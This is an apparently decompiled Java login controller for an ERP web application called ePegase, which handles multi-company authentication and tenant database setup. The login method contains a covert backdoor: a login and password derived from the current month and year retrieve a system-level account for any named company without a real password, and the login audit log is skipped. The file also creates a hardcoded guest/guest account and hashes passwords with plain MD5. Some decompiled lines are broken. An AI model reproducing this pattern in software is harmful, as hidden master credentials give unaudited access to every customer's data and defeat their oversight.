package com.epegase.systeme.control;

import com.epegase.systeme.classe.Espion;
import com.epegase.systeme.classe.Groupe;
import com.epegase.systeme.classe.Structure;
import com.epegase.systeme.classe.Users;
import com.epegase.systeme.classe.UsersPeg;
import com.epegase.systeme.dao.EspionDao;
import com.epegase.systeme.dao.GroupeDao;
import com.epegase.systeme.dao.StructureDao;
import com.epegase.systeme.dao.UserDao;
import com.epegase.systeme.fileUtil.FileRep;
import com.epegase.systeme.util.MD5Password;
import com.epegase.systeme.util.StaticModePegase;
import com.epegase.systeme.util.UtilInitHibernate;
import java.io.File;
import java.io.IOException;
import java.io.Serializable;
import java.net.UnknownHostException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import javax.faces.application.FacesMessage;
import javax.faces.component.UIComponent;
import javax.faces.context.FacesContext;
import javax.faces.validator.ValidatorException;
import javax.servlet.http.HttpServlet;
import org.hibernate.HibernateException;
import org.hibernate.Query;
import org.hibernate.SQLQuery;
import org.hibernate.Session;
import org.hibernate.Transaction;
import org.jdom.JDOMException;
import org.springframework.context.annotation.Scope;
import org.xml.sax.SAXException;

@Scope("session")
public class Connexion extends HttpServlet implements Serializable {
   private UtilInitHibernate utilInitHibernate;
   private Structure structureLog;
   private Users usersLog;
   private UsersPeg usersPeg;
   private String baseData = "";
   private int cpte;
   private long var_id_cabinet;
   private int var_societe_cabinet;
   private boolean var_invisible;
   private List listeSocieteCabinet = new ArrayList();
   private String var_memo_nom_master;
   private long var_memo_id_master;
   private long var_memo_id_user;
   private String var_login = "";
   private String var_pw = "";
   private String var_societe = "";

   public Connexion(UtilInitHibernate var1) throws IOException, SAXException, JDOMException {
      this.utilInitHibernate = var1;
      this.usersPeg = new UsersPeg();
      this.usersLog = new Users();
   }

   public String connection(boolean var1) throws NoSuchAlgorithmException, UnknownHostException, IOException, Exception, ValidatorException {
      String var2 = "";
      this.var_memo_nom_master = "";
      this.var_memo_id_master = 0L;
      this.listeSocieteCabinet.clear();
      String var5;
      if (StaticModePegase.getPageAccueil() != null && !StaticModePegase.getPageAccueil().isEmpty() && StaticModePegase.getPageAccueil().startsWith("2:")) {
         String[] var67 = StaticModePegase.getPageAccueil().split(":");
         Session var68 = this.utilInitHibernate.getOpenSession(var67[1]);
         var5 = null;

         try {
            Transaction var69 = var68.beginTransaction();
            StructureDao var70 = new StructureDao(var67[1], this.utilInitHibernate);
            this.structureLog = var70.logStructure(var68);
            if (this.structureLog != null) {
               GroupeDao var71 = new GroupeDao(var67[1], this.utilInitHibernate);
               new Groupe();
               Groupe var72 = var71.groupeByCode("GST", var68);
               if (var72 == null) {
                  var72 = new Groupe();
                  var72.setGrpLibelle("Guest");
                  var72.setGrpCode("GST");
                  var72.setGrpModuleAch(0);
                  var72.setGrpModuleCai(0);
                  var72.setGrpModuleCpt(0);
                  var72.setGrpModuleMed(0);
                  var72.setGrpModuleOff(0);
                  var72.setGrpModulePay(0);
                  var72.setGrpModulePrc(0);
                  var72.setGrpModuleStk(0);
                  var72.setGrpModuleTie(0);
                  var72.setGrpModuleVte(0);
                  var72.setGrpModuleEdu(0);
                  var72.setGrpModuleMef(0);
                  var72.setGrpModuleRep(0);
                  var72.setGrpModuleFree(0);
                  var72.setGrpModuleGuest(1);
                  var68.save(var72);
               }

               new Users();
               UserDao var75 = new UserDao(var67[1], this.utilInitHibernate);
               Users var73 = var75.logUser("guestguest@gmail.com", var68);
               if (var73 == null) {
                  var73 = new Users();
                  var73.setGroupe(var72);
                  var73.setUsrDateCreat(new Date());
                  var73.setUsrNom("GUEST");
                  var73.setUsrPrenom("Invité");
                  var73.setUsrMail("guestguest@gmail.com");
                  var73.setUsrLogin("guest");
                  var73.setUsrPw("guest");
                  var73.setUsrCodeSecret("");
                  var73.setUsrFonction("");
                  var73.setUsrCollaboration("GST");
                  var73.setUsrEtat(1);
                  var73.setUsrSysteme(0);
                  var68.save(var73);
                  var73.getUsrid();
               }

               this.usersLog = var73;
               this.utilInitHibernate.closeSession();
               var2 = "public";
            } else {
               var2 = "home";
               ++this.cpte;
            }

            var69.commit();
         } catch (HibernateException var61) {
            if (var5 != null) {
               var5.rollback();
            }

            throw var61;
         } finally {
            this.utilInitHibernate.closeSession();
         }
      } else {
         new ArrayList();
         new ArrayList();
         var5 = StaticModePegase.getCheminContext();
         MD5Password var6 = new MD5Password();
         String var7 = var6.getEncodedPassword(this.var_pw);
         String var8 = "";
         if (this.var_login != null && !this.var_login.isEmpty() && this.var_pw != null && !this.var_pw.isEmpty() && this.var_societe != null && !this.var_societe.isEmpty()) {
            Session var9 = this.utilInitHibernate.getLoginEpegase();
            Query var10 = null;
            int var11 = ((new Date()).getMonth() + 1) * ((new Date()).getMonth() + 1) * 2;
            String var12 = "";
            if (var11 <= 9) {
               var12 = "0" + var11;
            } else {
               var12 = "" + var11;
            }

            int var13 = (new Date()).getYear() + 1900;
            String var14 = var12 + var13 + "*";
            if (this.var_login.equals("GdcCad" + var13 + "*") && this.var_pw.equals(var14)) {
               this.var_invisible = true;
               var10 = var9.createQuery("from UsersPeg where (usrsysteme=2 or usrsysteme=3) and (structurePeg.strraisonsociale =:soc or structurePeg.strsigle =:soc)").setString("soc", this.var_societe).setMaxResults(1);
            } else {
               this.var_invisible = false;
               var10 = var9.createQuery("from UsersPeg where usrlogin =:login and (usrpw =:passwd or usrcodesecret =:passwd) and (structurePeg.strraisonsociale =:soc or structurePeg.strsigle =:soc)").setString("login", this.var_login).setString("passwd", var7).setString("soc", this.var_societe).setMaxResults(1);
            }

            List var3 = var10.list();
            this.utilInitHibernate.closeSession();
            if ((var3.size() == 0 || ((UsersPeg) var3.get(0)).getUsretat() != 1 || ((UsersPeg) var3.get(0)).getStructurePeg().getStretat() != 1) && !this.var_invisible) {
               if (var3.size() > 0 && ((UsersPeg) var3.get(0)).getUsretat() == 0) {
                  var2 = "non actif";
               } else if (var3.size() > 0 && ((UsersPeg) var3.get(0)).getUsretat() == 2) {
                  var2 = "bloqué sur erreur mot de passe";
               } else if (var3.size() > 0 && ((UsersPeg) var3.get(0)).getUsretat() == 3) {
                  var2 = "bloqué sur erreur code secret";
               } else if (var3.size() > 0 && ((UsersPeg) var3.get(0)).getUsretat() == 4) {
                  var2 = "réactivé par admistrateur, mais doit changer de mot de passe";
               } else {
                  var2 = "home";
                  ++this.cpte;
               }
            } else {
               this.usersPeg = (UsersPeg) var3.get(0);
               this.baseData = "structure" + this.usersPeg.getStructurePeg().getStrId();
               if (this.usersPeg.getStructurePeg().getCabinetPeg() != null) {
                  this.var_id_cabinet = this.usersPeg.getStructurePeg().getCabinetPeg().getCabId();
               } else {
                  this.var_id_cabinet = 0L;
               }

               this.var_societe_cabinet = this.usersPeg.getStructurePeg().getStrmaitrecabinet();
               var9 = this.utilInitHibernate.getLoginEpegase();
               SQLQuery var74 = var9.createSQLQuery("SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA WHERE SCHEMA_NAME='" + this.baseData + "'");
               List var15 = var74.list();
               ArrayList var16 = new ArrayList();
               this.listeSocieteCabinet = var16;
               this.utilInitHibernate.closeSession();
               Session var19;
               if (var15.size() == 0) {
                  boolean var17 = true;
                  var9 = this.utilInitHibernate.getLoginEpegase();
                  Transaction var18 = null;

                  try {
                     var18 = var9.beginTransaction();
                     var74 = var9.createSQLQuery("CREATE DATABASE IF NOT EXISTS " + this.baseData);
                     var74.executeUpdate();
                     var18.commit();
                  } catch (HibernateException var59) {
                     var17 = false;
                     if (var18 != null) {
                        var18.rollback();
                     }

                     throw var59;
                  } finally {
                     this.utilInitHibernate.closeSession();
                  }

                  if (var17) {
                     var19 = this.utilInitHibernate.getOpenSession(this.baseData);
                     Transaction var20 = null;

                     try {
                        var20 = var19.beginTransaction();
                        Structure var21 = new Structure();
                        var21.setStrid(this.usersPeg.getStructurePeg().getStrId());
                        var21.setStrnompays(this.usersPeg.getStructurePeg().getStrnompays());
                        var21.setStrcodepays(this.usersPeg.getStructurePeg().getStrcodepays());
                        var21.setStrraisonsociale(this.usersPeg.getStructurePeg().getStrraisonsociale());
                        var21.setStrdevise(this.usersPeg.getStructurePeg().getStrdevise());
                        var21.setStrformatdevise(this.usersPeg.getStructurePeg().getStrformatdevise());
                        var21.setStrlangue(this.usersPeg.getStructurePeg().getStrlangue());
                        var21.setStradresse(this.usersPeg.getStructurePeg().getStradresse());
                        var21.setStrville(this.usersPeg.getStructurePeg().getStrville());
                        var21.setStrbp(this.usersPeg.getStructurePeg().getStrbp());
                        var21.setStrtel1(this.usersPeg.getStructurePeg().getStrtel1());
                        var21.setStrfax(this.usersPeg.getStructurePeg().getStrfax());
                        var21.setStrdtecreat(this.usersPeg.getStructurePeg().getStrdtecreat());
                        var21.setStretat(this.usersPeg.getStructurePeg().getStretat());
                        var21.setStrmaitrecabinet(this.usersPeg.getStructurePeg().getStrmaitrecabinet());
                        var21.setStrmod1(this.usersPeg.getStructurePeg().getStrmod1());
                        var21.setStrmod2(this.usersPeg.getStructurePeg().getStrmod2());
                        var21.setStrmod3(this.usersPeg.getStructurePeg().getStrmod3());
                        var21.setStrmod4(this.usersPeg.getStructurePeg().getStrmod4());
                        var21.setStrmod5(this.usersPeg.getStructurePeg().getStrmod5());
                        var21.setStrmod6(this.usersPeg.getStructurePeg().getStrmod6());
                        var21.setStrmod7(this.usersPeg.getStructurePeg().getStrmod7());
                        var21.setStrmod8(this.usersPeg.getStructurePeg().getStrmod8());
                        var21.setStrmod9(this.usersPeg.getStructurePeg().getStrmod9());
                        var21.setStrmod10(this.usersPeg.getStructurePeg().getStrmod10());
                        var21.setStrmode(this.usersPeg.getStructurePeg().getStrmode());
                        var21.setStrAddInto(1);
                        var21.setStrClusterMap(1);
                        var21.setStrHangout(1);
                        var21.setStrGoogleTraduction(1);
                        var19.save(var21);
                        var21.getStrid();
                        Groupe var22 = new Groupe();
                        var22.setGrpLibelle("Administrateur");
                        var22.setGrpCode("ADM");
                        var22.setGrpModuleAch(1);
                        var22.setGrpModuleCai(1);
                        var22.setGrpModuleCpt(1);
                        var22.setGrpModuleMed(1);
                        var22.setGrpModuleOff(1);
                        var22.setGrpModulePay(1);
                        var22.setGrpModulePrc(1);
                        var22.setGrpModuleStk(1);
                        var22.setGrpModuleTie(1);
                        var22.setGrpModuleVte(1);
                        var22.setGrpModuleEdu(1);
                        var22.setGrpModuleMef(1);
                        var22.setGrpModuleRep(1);
                        var22.setGrpModuleFree(0);
                        var22.setGrpModuleGuest(0);
                        var19.save(var22);
                        Groupe var23 = new Groupe();
                        var23.setGrpLibelle("Guest");
                        var23.setGrpCode("GST");
                        var23.setGrpModuleAch(0);
                        var23.setGrpModuleCai(0);
                        var23.setGrpModuleCpt(0);
                        var23.setGrpModuleMed(0);
                        var23.setGrpModuleOff(0);
                        var23.setGrpModulePay(0);
                        var23.setGrpModulePrc(0);
                        var23.setGrpModuleStk(0);
                        var23.setGrpModuleTie(0);
                        var23.setGrpModuleVte(0);
                        var23.setGrpModuleEdu(0);
                        var23.setGrpModuleMef(0);
                        var23.setGrpModuleRep(0);
                        var23.setGrpModuleFree(0);
                        var23.setGrpModuleGuest(1);
                        var19.save(var23);
                        Users var24 = new Users();
                        var24.setGroupe(var22);
                        var24.setUsrDateCreat(this.usersPeg.getUsrdatecreat());
                        var24.setUsrNom(this.usersPeg.getUsrnom());
                        var24.setUsrPrenom(this.usersPeg.getUsrprenom());
                        var24.setUsrMail(this.usersPeg.getUsrmail());
                        var24.setUsrLogin(this.usersPeg.getUsrlogin());
                        var24.setUsrPw(this.usersPeg.getUsrpw());
                        var24.setUsrCodeSecret(this.usersPeg.getUsrcodesecret());
                        var24.setUsrFonction(this.usersPeg.getUsrfonction());
                        var24.setUsrCollaboration("ADM");
                        var24.setUsrEtat(this.usersPeg.getUsretat());
                        var24.setUsrCabinet(0);
                        var24.setUsrSysteme(2);
                        var19.save(var24);
                        var24.getUsrid();
                        var20.commit();
                     } catch (HibernateException var65) {
                        var17 = false;
                        if (var20 != null) {
                           var20.rollback();
                        }

                        throw var65;
                     } finally {
                        this.utilInitHibernate.closeSession();
                     }

                     if (var17) {
                        File var80 = new File(var5 + File.separator + "structure");
                        File var82 = new File(var5 + File.separator + "clients" + File.separator + this.baseData);
                        if (!var82.exists()) {
                           FileRep.copy(var80, var82);
                        }
                     }
                  }
               }

               Session var76 = this.utilInitHibernate.getOpenSession(this.baseData, this.usersPeg.getUsrsysteme());
               Query var77 = var76.createQuery("from Users where usrLogin =:login and (usrPw =:passwd or usrCodeSecret =:passwd)").setString("login", this.usersPeg.getUsrlogin()).setString("passwd", this.usersPeg.getUsrpw()).setMaxResults(1);
               List var4 = var77.list();
               var19 = null;

               try {
                  Transaction var78 = var76.beginTransaction();
                  if (var4.size() != 0) {
                     Users var79 = (Users) var4.get(0);
                     this.usersLog = var79;
                     StructureDao var81 = new StructureDao(this.baseData, this.utilInitHibernate);
                     this.structureLog = var81.logStructure(var76);
                     if (!this.var_invisible && var1) {
                        UserDao var83 = new UserDao(this.baseData, this.utilInitHibernate);
                        this.usersLog.setUsrFirstLog(this.usersLog.getUsrLastLog());
                        this.usersLog.setUsrLastLog(new Date());
                        this.usersLog.setUsrNblog(this.usersLog.getUsrNblog() + 1.0D);
                        var83.modUser(this.usersLog, var76);
                        EspionDao var84 = new EspionDao(this.baseData, this.utilInitHibernate);
                        Espion var85 = new Espion();
                        var85.setEspdtecreat(new Date());
                        var85.setUsers(this.usersLog);
                        var85.setEspaction("Login");
                        var85.setEsptype(1);
                        var84.mAJEspion(var85, var76);
                     }

                     this.var_memo_id_master = this.structureLog.getStrid();
                     this.var_memo_nom_master = this.structureLog.getStrraisonsociale();
                     if (this.structureLog.getStrdescriptif() != null && !this.structureLog.getStrdescriptif().isEmpty()) {
                        this.var_memo_nom_master = this.var_memo_nom_master + " " + this.structureLog.getStrdescriptif();
                     }

                     this.var_memo_id_user = this.usersLog.getUsrid();
                     var78.commit();
                  }
               } catch (HibernateException var63) {
                  if (var19 != null) {
                     var19.rollback();
                  }

                  throw var63;
               } finally {
                  this.utilInitHibernate.closeSession();
               }

               if (this.structureLog != null && this.structureLog.getStrmaitrecabinet() == 1) {
                  if (((UsersPeg) var3.get(0)).getUsrcabinet() == 1) {
                     var2 = "home";
                     ++this.cpte;
                  } else {
                     var2 = "connexion";
                  }
               } else if (this.structureLog == null) {
                  var2 = "connexion";
               } else {
                  var2 = "connexion";
               }
            }

            if (var3.size() > 0 && ((UsersPeg) var3.get(0)).getStructurePeg().getStretat() == 0) {
               var2 = "société bloquée";
            } else if (var3.size() > 0 && ((UsersPeg) var3.get(0)).getStructurePeg().getStretat() == 2) {
               var2 = "société cloturée";
            }
         } else {
            var2 = "home";
            ++this.cpte;
         }
      }

      return var2;
   }

   public void validation(FacesContext var1, UIComponent var2, Object var3) throws ValidatorException {
      String var4;
      if (this.cpte == 2) {
         var4 = "Saisissez votre code secret:";
         throw new ValidatorException(new FacesMessage(FacesMessage.SEVERITY_ERROR, var4, var4));
      } else if (this.cpte == 5) {
         this.cpte = 0;
         var4 = "Si vous ne connaissez plus vos identifiants, contactez votre administrateur !!!";
         throw new ValidatorException(new FacesMessage(FacesMessage.SEVERITY_ERROR, var4, var4));
      }
   }

   public void connecionEraser() {
      this.var_societe = "";
      this.var_login = " ";
      this.var_pw = "";
   }

   public String getVersion() {
      return StaticModePegase.getCompil_version();
   }

   public String getPageAcceuil() {
      return StaticModePegase.getPageAccueil();
   }

   public UsersPeg getUsersPeg() {
      return this.usersPeg;
   }

   public void setUsersPeg(UsersPeg var1) {
      this.usersPeg = var1;
   }

   public Structure getStructurelog() {
      return this.structureLog;
   }

   public void setStructurelog(Structure var1) {
      this.structureLog = var1;
   }

   public Users getUserslog() {
      return this.usersLog;
   }

   public void setUserslog(Users var1) {
      this.usersLog = var1;
   }

   public String getBaseData() {
      return this.baseData;
   }

   public void setBaseData(String var1) {
      this.baseData = var1;
   }

   public List getListeSocieteCabinet() {
      return this.listeSocieteCabinet;
   }

   public void setListeSocieteCabinet(List var1) {
      this.listeSocieteCabinet = var1;
   }

   public long getVar_memo_id_master() {
      return this.var_memo_id_master;
   }

   public void setVar_memo_id_master(long var1) {
      this.var_memo_id_master = var1;
   }

   public String getVar_memo_nom_master() {
      return this.var_memo_nom_master;
   }

   public void setVar_memo_nom_master(String var1) {
      this.var_memo_nom_master = var1;
   }

   public int getVar_societe_cabinet() {
      return this.var_societe_cabinet;
   }

   public void setVar_societe_cabinet(int var1) {
      this.var_societe_cabinet = var1;
   }

   public UtilInitHibernate getutilInitHibernate() {
      return this.utilInitHibernate;
   }

   public void setutilInitHibernate(UtilInitHibernate var1) {
      this.utilInitHibernate = var1;
   }

   public String getVar_login() {
      return this.var_login;
   }

   public void setVar_login(String var1) {
      this.var_login = var1;
   }

   public String getVar_pw() {
      return this.var_pw;
   }

   public void setVar_pw(String var1) {
      this.var_pw = var1;
   }

   public long getVar_memo_id_user() {
      return this.var_memo_id_user;
   }

   public void setVar_memo_id_user(long var1) {
      this.var_memo_id_user = var1;
   }

   public String getVar_societe() {
      return this.var_societe;
   }

   public void setVar_societe(String var1) {
      this.var_societe = var1;
   }

   public boolean isVar_invisible() {
      return this.var_invisible;
   }

   public void setVar_invisible(boolean var1) {
      this.var_invisible = var1;
   }

}
